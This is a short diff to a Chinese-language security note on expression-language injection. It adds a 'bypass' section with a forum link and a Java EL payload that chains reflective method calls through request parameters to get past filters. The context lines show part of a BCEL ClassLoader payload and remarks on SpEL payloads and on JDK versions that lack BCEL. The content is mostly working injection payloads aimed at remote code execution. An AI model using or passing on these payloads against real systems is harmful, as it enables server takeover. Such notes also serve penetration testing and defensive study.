@@ -39,3 +39,9 @@ ${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInsta
 ```
 **需要注意jdk版本问题可能没有bcel类**
 理论上spel表达式可以用的payLoad 这里也可以利用
+## bypass
+
+https://forum.butian.net/share/1880
+```java
+${""[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)}
+```
